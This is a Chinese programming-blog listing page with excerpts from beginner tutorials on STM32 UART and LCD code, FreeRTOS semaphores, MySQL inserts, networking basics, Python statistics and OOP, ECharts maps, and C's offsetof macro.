二.STM32CubeMX的配置 模式选择异步通信，波特率选择115200。
开启中断
！！！默认的引脚与板子上的引脚不同记得修改，修改的方法是点击PA9和PA10选择 UART
三.代码的编写 uint16_t rx_buf[200]; HAL_UART_Receive_IT(&amp;huart1,(uint8_t*)rx_buf,1); 首先是全局变量的定义和接收中断的开启
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart) { if(rx_buf[0]=='a') { printf("ok"); } HAL_UART_Receive_IT(&amp;huart1,(uint8_t*)rx_buf,1); } 接收中断的编写
int fputc(int ch,File *p) { HAL_UART_Transmit(&amp;huart1,(uint8_t*)&amp;ch,1,0xFF); return ch; } printf的重定向
！！记得打开微库，即勾选Use MicroLIB
总结 本文代码的效果是如果接收到a即回复ok 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f32bdd04cee35f010f09d019895bbe11/" rel="bookmark">
			最详细蓝桥杯嵌入式完整教程（一）：工程模块建立
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本人是一名普通的大二学生，计划参加14届蓝桥杯嵌入式。然后也是在我的学习的过程中，充分认识到一个人的学习是不全面的，然后就有了这篇文章，希望和大家一起学习，一起进步，我也是第一次写此类的文章，如有错误，希望大家能够指出。
开始的第一步就是建立一个工程模块，之后的一些系列操作都是在这个模块上完成的。
在选择完封装之后，选择Start Project正式开始配置。
其他的打开文件方式如下： 进入刚刚我们设置的文件路径，进入文件。
打开文件之后（为下载程序做准备）：
最后回到我们建立的文件夹
到此为止，我们成功建立工程模块。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/885ab7067331d90040880a5ae06eb774/" rel="bookmark">
			FreeRTOS-信号量详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：嵌入式入坑者，与大家一起加油，希望文章能够帮助各位！！！！
📃个人主页：@rivencode的个人主页
🔥系列专栏：玩转FreeRTOS
💬保持学习、保持热爱、认真分享、一起进步！！！
目录 前言一、信号量的简介二、FreeRTOS信号量1.二值信号量2.计数信号量3.互斥信号量1.优先级反转2.优先级继承3.互斥信号量解析 4.递归互斥信号量1.互斥信号量的缺陷2.递归互斥信号量解析 三.总结 前言 本文将详细全方位的讲解FreeRTOS的信量量，其实你学完了《FreeRTOS-消息队列详解》信号量的学习就非常简单了，因为所有的信号量的本质的都是特殊的队列(特殊在哪里：信号量只有队列头部，并没有后面的环形存储区，也就是说信号量只负责消息传递，并不传递数据)，当然这么多信号量也是有区别的，不同的信号量对应不同的应用场景，还是以源码分析为主，源码分析透了，这几种信号量的区别，或者特殊机制(互斥量的优先级继承)就一清二楚了。
在学习信号量之前请将FreeRTOS的队列消息了如指掌：
《FreeRTOS-消息队列详解》
一、信号量的简介 信号量（Semaphore）是一种实现任务间通信的机制，可以实现任务之间同步或临界资源的互斥访问，其实信号量主要的功能就是实现任务之间的同步与互斥，实现的方式主要就是依靠队列(信号量是特殊的队列)的任务阻塞机制。
既然队列也可以实现同步与互斥那为什么还要信号量？
答：信号量相比队列更节省空间，因为实现同步与互斥不需要传递数据，所以信号量没有队列后面的环形存储区，信号量主要就是依靠计数值uxMessagesWaiting（在队列中表示队列现有消息个数，在信号量中表示有效信号量个数）。
什么是同步与互斥？
1.同步 比如说，买包子
我要去买包子，如果包子店没有包子了，则需要等待卖包子的把包子做出来我才能买到包子，这个等待的过程就叫做同步。(在实际应用中：一个采集数据的传感器任务，一个处理数据的任务，则处理数据的任务需要等待传感器去采用数据，则在FreeRTOS系统中等待不能干等着，在该任务等待的过程中，CPU转而可以去执行其他任务，则就可以提高效率，则就是队列的阻塞机制)
2.互斥 比如说，抢厕所
厕所只有一个，一个人进去上了，另一个人也要上，则必须等待前人上完厕所才能上，等待的过程就是同步，而保护厕所的过程叫做互斥，则厕所就是所谓临界资源，同一时间只能一个人使用厕所，当然前人上完厕所应该提醒等待的人，厕所用完了可以上了，其中本质也是阻塞机制。
uxMessagesWaiting作为复用在信号量中表示资源的数量，所有获取信号量的任务都会将该整数减一，当该整数值为零时，则此时想要获取的任务则会进入阻塞态，释放信号量的任务都会将该整数加一，不过当该整数值为最大值时(最大值要看你是什么信号量)，则此时想要释信号量的任务则并不会进入阻塞态，直接返回释放信号量失败。
接下来就分别介绍二值信号量、计数信号量、互斥信号量、递归互斥信号量、它们的应用场景、特殊机制、以源码分析的方式，深入理解信号量！！！
创建信号量就对应创建特殊队列，获取信号量就对应队列出队，释放信号量就对应队列入队，学好了队列就基本学好了信号量，所以这一章主要是针对互斥量(优先级反转、优先级继承、递归互斥信号量)。
二、FreeRTOS信号量 1.二值信号量 所谓二值信号量其实就是一个队列长度为1，没有数据存储器的队列，而二值则表示计数值uxMessagesWaiting只有0和1两种状态(就是队列空与队列满两种情况)，uxMessagesWaiting在队列中表示队列中现有消息数量，而在信号量中则表示信号量的数量。
uxMessagesWaiting为0表示：信号量资源被获取了.
uxMessagesWaiting为1表示：信号量资源被释放了
把这种只有 0 和 1 两种情况的信号量称之为二值信号量。
由于二值信号量就是特殊的队列，其实它的运转机制就是利用了队列的阻塞机，从而达到实现任务之间的同步与互斥(有优先级反转的缺陷)。
二值信号量的应用场景：
二值信号量用于同步： 在多任务系统中，经常会使用二值信号量来实现任务之间或者任务与中断之间的同步，比如，某个任务需要等待一个标记，那么任务可以在轮询中查询这个标记有没有被置位，则任务在等待的过程也会消耗CPU的资源，如下图所示：
上面的代码看似没问题，其实存在有两个问题：
1.使用了全局变量flagCalcEnd，(如果同时读写flagCalcEnd则会出问题)。
2.任务二在等待任务一计算完sum的值的过程中，任务二也会参与任务调度消耗CPU资源(假设只有这两个任务,优先级相同，且支持时间片轮转，则在任务一在计算sum值的过程中，任务一与任务二轮流执行相同时间片，只不过任务二就一直判断flagCalcEnd的值是否为1，相当于就是浪费CPU的资源)
所以二值信号量就可以解决这个问题，在任务一计算sum的值的过程中，任务二应该进入阻塞态让出CPU的使用权，在任务二阻塞期间任务一就可以独占CPU全速计算sum的值，代码如下图所示：
当任务一计算完sum值，然后才释放信号量(通知任务二有数据来了)，任务二则刚开始sum值未计算完成时，获取信号量会失败，任务进入阻塞态，等待大任务一计算sum完成释放信号量则任务被唤醒，则就可以出来后面的事情。
使用信号量的方式就可以完美实现同步，即保证了正确性，有保证了效率(让任务进入阻塞态)。
二值信号量在任务与中断同步的应用场景：
我们在串口接收中，我们并不知道什么时候有数据发送过来(等数据过来标记一次)，还有一个处理串口接收到的数据，在任务系统中不可能时时刻刻去判断是否有串口有数据过来(判断标志位)，所以在这种情况下使用二值信号量是很好的办法，当没有数据到来的时候，任务就进入阻塞态，不参与任务的调度，等到数据到来了，释放一个二值信号量，任务就立即从阻塞态中解除，进入就绪态，然后运行的时候处理数据，这样子系统的资源就会很好的被利用起来。
其实所谓的操作系统就是为了榨干CPU的性能，不能让CPU闲着，干等着。
二值信号量用于互斥： 二值信号量一般不用于任务之间的互斥(任务之间互斥的访问一个临界资源，同一时间只能一个任务可以使用)，因为它有优先级反转的缺点，解决互斥的方式就是使用互斥信号量(具有优先级继承的机制能减少优先级反转的影响)，关于优先级反转，优先级继承等下面讲互斥量的时候在讲。
FreeRTOS 二值信号量相关 API 函数
关于中断中获取或释放信号量的函数就不在讲解了，在讲解队列的时候已经详细阐述，在任务与在中断中使用的API函数的区别，其实函数的主体代码是一模一样的，就是在中断中：
1.不能允许阻塞
2.不能立马发送任务调度
1.二值信号量的创建
函数 xSemaphoreCreateBinary()
此函数用于使用动态方式创建二值信号量，关于动态与静态创建的区别之前的文章详细阐述过，我们这里只讲动态创建就完了，其实xSemaphoreCreateBinary()只是一个宏正在调用的函数为通用队列创建函数xQueueGenericCreate，只不过传入的参数为：创建一个，队列长度为1(队列不是空就是满)，队列项(消息)大小为0(没有后面的数据存储区)，队列类型就为二值信号量。
uxItemSize为零，则在xQueueGenericCreate()函数内部则不会分配环形存储区，只需要队列头(队列结构体)。
既然没有环形存储器了，那信号量的个数(资源的数量)用什么表示？ 队列结构体中的uxMessagesWaiting来表示信号量数量如下图所示。
2.获取信号量函数 xSemaphoreTake()
从上图可以看出xSemaphoreTake其实是一个宏，真正调用的函数为 xQueueSemaphoreTake()来获取信号量，xQueueSemaphoreTake()看函数名带有一个Queue就知道其实信号量还是队列操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/885ab7067331d90040880a5ae06eb774/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c70f0120f9063257b67dc75b046ee7f/" rel="bookmark">
			MySQL插入数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、怎么样插入数据
二、通过命令提示窗口插入数据
三、使用PHP脚本插入数据
一、怎么样插入数据 在MySQL 表中可以使用 INSERT INTO SQL语句来插入数据。
可以通过 mysql&gt; 命令提示窗口中向数据表中插入数据，或者通过PHP脚本来插入数据。
下面是向MySQL数据表插入数据通用的INSERT INTO SQL语法：
INSERT INTO table_name ( field1, field2,...fieldN )
VALUES
( value1, value2,...valueN );
注意如果数据是字符型，必须使用单引号或者双引号，如："value"。
二、通过命令提示窗口插入数据 下面的例子中将向test_tbl 表插入三条数据:
root@host# mysql -u root -p password;
Enter password:*******
mysql&gt; use TEST;
Database changed
mysql&gt; INSERT INTO test_tbl -&gt; (test_title, test_author, submission_date)
-&gt; VALUES
-&gt; ("学习 PHP", "TEST", NOW());
Query OK, 1 rows affected, 1 warnings (0.01 sec)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c70f0120f9063257b67dc75b046ee7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acf2ca37c2949d4a73b4545b898a78ad/" rel="bookmark">
			网络编程基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、概念了解
二、协议分层 1、OSI七层模型
2、TCP/IP五层协议
一、概念了解 IP地址：用于定位主机的网络地址，IP地址由4个字节组成，常用点分十进制来进行表示，每个字节用十进制数表示，四个字节之间用.分隔，例如：126.2.34.9。
特殊的IP地址：127.*(第一个字节为127的IP地址)，主要用于本机回环测试，即本机到本机之间网络通信测试。
端口号：用于定位主机中的进程。
注意：
一个进程启动之后，系统会随机分配一个端口号。多个进程不能同时绑定同一个端口号，但是一个进程可以有多个端口号。端口号的取值范围是：0~65535。 网络协议： 网络通信经过所有的网络设备都必须遵守的约定，简单来说就是收发双方定义的通信规则，只有彼此遵守这个约定，通信才能进行，网络协议三要素：语法、语义、时序。
网络协议也需要分配端口号，其中0~1023的端口号是预留给应用层协议的。
五元组：在TCP/IP协议中，用于标识一个网络通信。
五元组的组成要素：
源IP地址：用于标识源主机（发送方）的网络地址。源端口号：用于标识主机中本次通信发送数据的进程。目的IP地址：用于标识目的主机（接收方）的网络地址。目的端口号：用于标识主机中本次通信接收数据的进程。协议号：标识发送方和接收方进程所约定的数据格式。 二、协议分层 1、OSI七层模型 OSI七层模型将网络从逻辑常分为了七层（由高到低如下所示）：
应用层：针对特定应用的协议。表示层：设备固有的数据格式和网络标准数据格式转换。会话层：进行通信管理。传输层：管理两个结点之间的数据传输，负责的是可靠传输。网络层：地址管理与路由选择。数据链路层：互联设备之间传送和识别数据帧。物理层：比特流与电子信号的切换，与硬件密切相关。 OSI七层模型概念清楚，理论也比较完善，但是十分复杂也不使用，所以OSI七层模型最终也没有实现。
2、TCP/IP五层协议 TCP/IP协议采用五层网络模型，将OSI七层模型的高三层合并为了应用层。
五层网络模型从下到上依次是：
物理层：网络通信中的硬件设备，例如：网线、网卡，还有对于硬件设备的约定都是物理层协议锁负责的范畴用来保证主机和网络设备之间都是相互匹配的。数据链路层：用于完成相邻的两个设备之间的通信，是局部的。网络层：负责点到点之间的通信，网络之间的两个任意结点之间都可以实现通信，是全局范围的，并且网络层会为通信的的两个结点之间规划出一最合适的路线。传输层：是端到端之间的通信，只关注起点到终点的数据是否发送成功，不关注发送的具体细节。应用层：与应用程序是密切相关的，关注的是所传输的数据的用途。 那么如果发送一条协议报文，数据在各层之间传输的形式是怎样的（假设是TCP报文）？
封装过程：发送方发送数据
分用过程：接收方接收数据
从物理层开始接收数据，到物理层又逐一封装起来，相当于是封装的逆过程。
上述是整体的一个情况，但是发送方和接收方之间还会存在多个交换机和路由器。
交换机：
路由器：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a03cf9ebcd21b34224f53dc966cefe0e/" rel="bookmark">
			Python数据分析入门--灰色预测学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、灰色预测简介二、GM(1,1)模型的原理1. 级比检验2. 构造累加序列3. 生成紧邻均值序列4. 建立灰微分方程5. 求解白化方程6. 精度检验 三、Python实现GM(1,1)预测总结 一、灰色预测简介 灰色预测模型（Gray Forecast Model）是数学建模中的一个常用模型，旨在通过少量的、不完全的信息，建立数学模型并做出预测的一种预测方法，是处理小样本预测问题的有效工具，而对于小样本预测问题回归分析和神经网络模型的处理效果都不如灰色预测。
黑色系统被称为信息完全未确定的系统，白色系统被称信息完全确定的系统，灰色系统就是这介于这之间，一部分信息是已知的，另一部分信息是未知的，系统内各因素间有不确定的关系。
二、GM(1,1)模型的原理 GM(1,1)是一阶微分方程模型，核心是通过对已知序列数据进行累加构造来制造规律，并利用常微分方程和最小二乘法来求解拟合的新序列。
1. 级比检验 当我们得到一组数据时，为了保证灰色预测GM(1,1)模型的可行性，需要对原始序列数据进行级比检验。
计算序列数据的级比 λ(k）
若计算出来的所有级比 λ ( k ) \lambda(k) λ(k)都落在区间 ( e − 2 / n + 1 , e 2 / n + 2 ) (e^{-2/n+1} , e^{2/n+2} ) (e−2/n+1,e2/n+2)内，则可进行灰色预测；若不在 ( e − 2 / n + 1 , e 2 / n + 2 ) (e^{-2/n+1} , e^{2/n+2} ) (e−2/n+1,e2/n+2)内，则要通过对序列数据进行平移变换使级比落在区间内；若平移变换也无法使级比落在区间内则改序列数据不适用GM(1,1)模型预测。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a03cf9ebcd21b34224f53dc966cefe0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3193456a2ce85ef1e01f5a219b37cebd/" rel="bookmark">
			Python面向对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象编程是在面向过程编程的基础上发展来的，它比面向过程编程具有更强的灵活性和扩展性。面向对象编程是程序员发展的分水岭，很多初学者会因无法理解面向对象而放弃学习编程。
面向对象编程（Object-oriented Programming，简称 OOP），是一种封装代码的方法。其实，在前面章节的学习中，我们已经接触了封装，比如说，将乱七八糟的数据扔进列表中，这就是一种简单的封装，是数据层面的封装；把常用的代码块打包成一个函数，这也是一种封装，是语句层面的封装。
代码封装，其实就是隐藏实现功能的具体代码，仅留给用户使用的接口，就好像使用计算机，用户只需要使用键盘、鼠标就可以实现一些功能，而根本不需要知道其内部是如何工作的。 本节所讲的面向对象编程，也是一种封装的思想，不过显然比以上两种封装更先进，它可以更好地模拟真实世界里的事物（将其视为对象），并把描述特征的数据和代码块（函数）封装到一起。
打个比方，若在某游戏中设计一个乌龟的角色，应该如何来实现呢？使用面向对象的思想会更简单，可以分为如下两个方面进行描述：
从表面特征来描述，例如，绿色的、有 4 条腿、重 10 kg、有外壳等等。
从所具有的的行为来描述，例如，它会爬、会吃东西、会睡觉、会将头和四肢缩到壳里，等等。
如果将乌龟用代码来表示，则其表面特征可以用变量来表示，其行为特征可以通过建立各种函数来表示。参考代码如下所示：
class tortoise: bodyColor ="绿色" footNum =4 weight =10 hasShell = True #会爬 defcrawl(self): print("乌龟会爬") #会吃东西 defeat(self): print("乌龟吃东西") #会睡觉 defsleep(self): print("乌龟在睡觉") #会缩到壳里 defprotect(self): print("乌龟缩进了壳里") 注意，以上代码仅是为了演示面向对象的编程思想，具体细节后续会做详细介绍。 因此，从某种程序上，相比较只用变量或只用函数，使用面向对象的思想可以更好地模拟现实生活中的事物。
不仅如此，在 Python 中，所有的变量其实也都是对象，包括整形（int）、浮点型（float）、字符串（str）、列表(list)、元组(tuple)、字典（dict）和集合（set）。以字典（dict）为例，它包含多个函数供我们使用，例如使用 keys() 获取字典中所有的键，使用 values() 获取字典中所有的值，使用 item() 获取字典中所有的键值对，等等。
面向对象相关术语 在系统学习面向对象编程之前，初学者要了解有关面向对象的一些术语。当和其他人讨论代码的时候，或者尝试查找我们遇到的问题的解决方案时，知道正确的术语会很有帮助。
面向对象中，常用术语包括：
类：可以理解是一个模板，通过它可以创建出无数个具体实例。比如，前面编写的 tortoise 表示的只是乌龟这个物种，通过它可以创建出无数个实例来代表各种不同特征的乌龟（这一过程又称为类的实例化）。
对象：类并不能直接使用，通过类创建出的实例（又称对象）才能使用。这有点像汽车图纸和汽车的关系，图纸本身（类）并不能为人们使用，通过图纸创建出的一辆辆车（对象）才能使用。
属性：类中的所有变量称为属性。例如，tortoise 这个类中，bodyColor、footNum、weight、hasShell 都是这个类拥有的属性。
方法：类中的所有函数通常称为方法。不过，和函数所有不同的是，类方法至少要包含一个 self 参数（后续会做详细介绍）。例如，tortoise 类中，crawl()、eat()、sleep()、protect() 都是这个类所拥有的方法，类方法无法单独使用，只能和类的对象一起使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0609c8da4b6b89e8f1f7406d7404fdf6/" rel="bookmark">
			c&#43;&#43;在VScode批量注释的快捷键使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工作环境：VScode
批量注释快捷键
单行注释：// 描述信息
通常放在一行代码的上方，或者一条语句的末尾，对该行代码说明
快捷键：Ctrl + /
多行注释： /* 描述信息 */
通常放在一段代码的上方，对该段代码做整体说明
快捷键：Alt + shift + a
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12bbba8423525a6363653b000605f8cd/" rel="bookmark">
			echarts省市区id（区域编码）实现地图下钻点击（data赋值自定义属性值，geojson信息获取）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		致新的一年：不知不觉已经是2023年，祝新的一年大展宏图（兔），前途（兔）似锦，今年梦想实现！ 正文：
接触echarts也有很长一段时间了，最近有个很常见的需求，实现省市区下钻，高亮一些有数据的区域例如中国地图的广东省、北京市，接到这个需求，脑海里思考的问题有：（1）通过什么去实现这种下钻文件的拿取 （2）如何实现指定区域的高亮效果（3）地图数据如何跟后端维持一致
产品想实现的效果实际上类似如下+下钻功能：
问题（1）：
对echarts有过经验的会发现echarts上面点击事件默认返回的只有点击区域的name中文值，一般都会通过name值去匹配前端写好的一份如{'广东省':'4400000'}实现对应省份区域编码的拿取，这样是很不科学的，毕竟区域名称并不是一成不变的，后端的中文名字也不一定会跟前端保持一致，所以问题来了，如何让echarts点击事件能返回我们想要的数据，例如返回如data:{name:'广东省',code:4400000,xxx}等数据？直接上实现方案：借助geo图层结合series里面的map层赋值
方案一：name值获取对应文件，准备好省市区对应的区域编码code json文件，获取地图json文件跟实现下钻网上已经有很多好文，在此不再讲实现方案（大神们自行百度google， 棒棒哒）
this.myChart.on('click',params=&gt;{ // 实现地图下钻 const {data={}}= params const {name=''} = data const mapObj = { '广东':44000000, '上海':xxxxx } // 获取对应的json文件处理方法 getMapJSON(`${mapObj[name]}.json`).then(()=&gt;{ console.log("下钻后对应处理") }) }) 方案二：方案一拿到的只能拿到区域名称，并没办法拿到区域编码和相关id，方案二拿取地图geojson文件里面自带对应属性值获取，个人建议这个方法更好，可以自定义一些属性值，直接上例子demo
（1）观察geojson，我们会发现features里面的properties很多情况都会需要使用到，如下
（2）思路：获取到这个属性的属性值，实现，上代码：
方法一（需要下钻建议该方式）：
// 方法一：注入文件后拿geoJSON数据中的properties属性 axios({ method: "get", url: "/china.json", }).then((res) =&gt; { const mapName = "china"; echarts.registerMap(mapName, (data) =&gt; { console.log("获取中国地图数据", data); let arr = []; data.features.forEach((item) =&gt; { let obj = { name: item.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12bbba8423525a6363653b000605f8cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db86c1b690974809fde8f3fe368ca8c5/" rel="bookmark">
			实现宏offsetof()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本期介绍🍖
主要介绍：什么是offsetof()，offsetof()的用法，如何自己实现这个宏👀。
offsetof其实是一个宏，作用是：能够求出指定成员相对于结构体起始地址的偏移量（单位：字节byte）。大部分C语言初学者在看见offsetof都会下意识的认为它是一个函数，这也不怪它们，因为宏命名约定的是全大写。
定义类型：size_t offsetof(type, m_name)
其中，参数type可以是结构体类型，也可以是结构体名；参数m_name是需要求偏移量的结构体成员名。宏offsetof()的返回类型为size_t，即unsigned int类型。在使用offsetof()前需要先引用头文件&lt;stddef.h&gt;。下面是案例：
#include&lt;stddef.h&gt; struct S { char a; int b; float c; }; int main() { printf("%d\n", offsetof(struct S, a)); printf("%d\n", offsetof(struct S, b)); printf("%d\n", offsetof(struct S, c)); return 0; } 相信有些同学会不理解这里的结果，或者甚至都没有听说过结构体还有什么偏移量的，这就要说到结构体内存对齐了。我曾今讲述过，这是链接：结构体内存对齐。
上面我们了解了什么是offsetof()，以及它的用法，下面我们就来尝试一下自己实现这个宏。首先，我们知道宏有两个参数（结构体名，成员名），那怎么通过这两个参数求偏移量呢？很简单，由于&amp;结构体名求的就是结构体起始位置的地址，故我们只要用成员变量的地址减去起始位置的地址，就可以算出成员的偏移量了。如下图所示：
#define OFFSETOF(type, name_m) (size_t)&amp;(((type*)0)-&gt;name_m) //将0地址设置为结构体的起始地址，然后取成员变量的地址，就是该成员的偏移量 struct S { char a; int b; float c; }; int main() { printf("%d\n", OFFSETOF(struct S, a)); printf("%d\n", OFFSETOF(struct S, b)); printf("%d\n", OFFSETOF(struct S, c)); return 0; } 这份博客👍如果对你有帮助，给博主一个免费的点赞以示鼓励欢迎各位🔎点赞👍评论收藏⭐️，谢谢！！！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db86c1b690974809fde8f3fe368ca8c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0476b7b1fa1baf403c9604f33380f0fc/" rel="bookmark">
			【Python】单样本、独立样本、配对样本的t检验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		t检验通常分为三种，分别是单样本t检验、两独立样本t检验和配对样本t检验。
python中经常使用scipy模块中的t检验相关函数进行t检验。
单样本t检验使用ttest_1samp()函数。
独立样本t检验使用ttest_ind()函数。
配对样本t检验使用ttest_rel()函数。
一、单样本t检验 单样本t检验用于，在已知总体均数的情况下，样本均数𝑋与已知总体均数𝜇0的比较，其中样本均数𝑋代表未知总体均数𝜇。
条件： 样本含量较小时，要求样本符合正态分布。
案例： 某医生测量了36名从事铅作业男性工人的血红蛋白含量，算得其均数为130.83g/L，标准差为25.74g/L。问从事铅作业的男性工人的血红蛋白含量均数是否等于正常成年男性的均数140g/L？
36名从事铅作业男性工人的血红蛋白含量： [112,137,129,126,88,90,105,178,130,128,126,103,172,116,125,90,96,162,157,151,135,113,175,129,165,171,128,128,160,110,140,163,100,129,116,127]
假设检验的步骤： 建立假设检验，确定检验水准。
𝐻0:𝜇=𝜇0,即从事铅作业的男性工人与正常男性的血红蛋白含量均数相等。
𝐻1:𝜇≠𝜇0,即从事铅作业的男性工人与正常男性的血红蛋白含量均数不等。
𝛼=0.05
计算检验统计量。
确定P。
import numpy as np from scipy import stats hb1=np.array([112,137,129,126,88,90,105,178,130,128,126,103,172,116,125,90,96,162,157,151,135,113,175,129,165,171,128,128,160,110,140,163,100,129,116,127] ) ## 正态性检验 stats.shapiro(hb1) p&gt;0.05,样本符合正态分布，可以进行单样本t检验
# 单样本t检验 stats.ttest_1samp(hb1,140) p&lt;0.05,按𝛼=0.05α=0.05水准拒绝原假设𝐻0，接受备择假设𝐻1，差异有统计学意义，可以认为从事铅作业男性工人的平均血红蛋白含量低于正常成年男性的平均血红蛋白含量。
二、两独立样本t检验 独立样本t检验，用于两个完全独立的、符合正态分布的样本的均数比较。
根据两样本的方差是否相等，可分为：
总体方差相等的t检验
总体方差不等的t检验
在python中，使用scipy包的ttest_ind()函数来进行两独立样本的t检验，两样本不符合方差齐性时需要传入参数：eual_var=False,这个参数默认为True。
stats.shapiro()用于正态性检验。
stats.levene()用于方差齐性检验。
1. 总体方差相等的两独立样本t检验 案例： 为探讨青藤碱抗兔动脉粥样硬化作用，采用单纯高脂饲料12周喂养方法建立动脉粥样硬化家兔模型。将12周造模成功家兔随机等分为2组。模型组给予高脂饲料100g/d；青藤碱组除给与高脂饲料100g/d外，在饲料中添加青藤碱109mg/(kg·d)。连续喂养3周，试验结束后心脏采血，测定心脏血液中高密度脂蛋白。结果如下：
青藤碱组𝑋1:[0.66,0.76,0.79,0.88,0.78,0.66,0.75,0.88]
模型组𝑋2:[0.58,0.62,0.59,0.70,0.69,0.68,0.58,0.60]
根据以上结果能否认为模型组与青藤碱组心脏血液中高密度脂蛋白含量的总体均数不同?
X1=np.array([0.66,0.76,0.79,0.88,0.78,0.66,0.75,0.88]) X2=np.array([0.58,0.62,0.59,0.70,0.69,0.68,0.58,0.60]) # 正态性检验 print("X1组正态性检验结果：{}".format(stats.shapiro(X1))) print("X2组正态性检验结果：{}".format(stats.shapiro(X2))) # 方差齐性检验 print("X1与X2方差齐性检验结果：{}".format(stats.levene(X1,X2))) X1、X2组正态性检验的p值均大于0.05，符合正态分布。方差齐性检验的p值大于0.05，两样本符合方差齐性。
# 总体方差相等的两独立样本t检验 stats.ttest_ind(X1,X2) t检验p值小于0.05，按𝛼水准，拒绝𝐻0，接受𝐻1，差异具有统计学意义，可认为青藤碱组与模型组心脏血液中的HDL含量总体均数不同。
2. 总体方差不等的两独立样本t检验 案例： 为分析血糖控制对血清总胆固醇含量的影响，调查了某社区2型糖尿病患者，各测量了25名血糖控制较差（甲组）和25名血糖控制较好（乙组）的患者血清总胆固醇含量，结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0476b7b1fa1baf403c9604f33380f0fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23a65ab37dfa0c9e88506880831da00a/" rel="bookmark">
			hadoop连接外网及内网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
文章目录
前言
一、hadoop连接不上网原因
二、如何连接
1.连接内网
2.连接外网
总结
前言 提示：这里可以添加本文要记录的大概内容：
例如：随着“互联网+”时代的到来，互联网的发展又到了一个新的高度，本文就介绍了hadoop的基础内容。
提示：以下是本篇文章正文内容，下面案例可供参考
一、hadoop连接不上网原因 示例：IP地址不对，dns未设置
二、如何连接 1.连接内网 内网连接不成功，往往是因为ip地址未修改：
ifconfig 命令查看虚拟机IP地址
如果输入这个命令没有IP地址，可cmd，输入ipconfig,查看电脑的IP地址
注意：电脑的IP地址和虚拟机地址一致
如果不一致，可以选中右下角更改设置 选择是，nat模式还原默认模式
还原之后，虚拟机IP地址和电脑一致
vim /etc/sysconfig/network-scripts/ifcfg-ens33 编辑内容
输入i进入编辑模式。修改一下内容
ping一下IP地址是否可以ping通
2.连接外网 有时候可以连接的上内网，但是连接不上。
是什么原因呢？
具体分析如下：
1.虚拟机dns未设置
打开虚拟机
修改之后重启试一试
ping百度是否可以ping通
ping www.baidu.com 总结 提示：这里对文章进行总结：
例如：以上就是今天要讲的内容，本文仅仅简单介绍了hadoop连接不上网的操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49c63b227517a958a3d01c594c14ffae/" rel="bookmark">
			蓝桥杯之嵌入式学习之旅（LCD）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一.LCD的原理图​编辑
二.STM32CubeMX的配置 三.代码介绍
四.与LED结合的例子
一.LCD的原理图 二.STM32CubeMX的配置 即把对应的引脚设为输出状态即可，为了方便以后的调试我额外初始化了LED灯切换状态的引PD2，LED灯的教程具体见上一节。 三.代码介绍 基本的LCD代码
LCD_Init();//LCD的初始化 LCD_Clear(Blue);//刷新屏幕为蓝色 LCD_SetTextColor(White);//设置字体颜色为白色 LCD_SetBackColor(Blue);//设置背景颜色为蓝色 LCD_DisplayChar(Line, Column,Ascii);//在第Line行，column列写字符Ascii LCD_DisplayStringLine(u8 Line, u8 *ptr);//在第Line行显示字符串ptr 字符高亮显示的代码
void LCDlight(uint8_t*leg1,uint16_t pos,uint8_t Line,uint16_t Color) { int j=0; while(leg1[j]!= '\0') {	if(j!=pos) { LCD_DisplayChar(Line,256-16*j,leg1[j]); } j++; } LCD_SetBackColor(Color); LCD_DisplayChar(Line,256-16*pos,leg1[pos]); LCD_SetBackColor(Blue); } 1.pos是高亮的字符位置，其实质是先将背景设为黄色，然后再设置对应位置的字符背景为黄色，再将背景切换为蓝色。因为设置背景颜色的函数只作用于函数之后的文字，所以能够达成这样的效果。
2.因为其LCD屏幕的分辨率为240*320，而一个字的宽度为16，所以256是首行缩进四个字符
四.与LED结合的例子 初始化
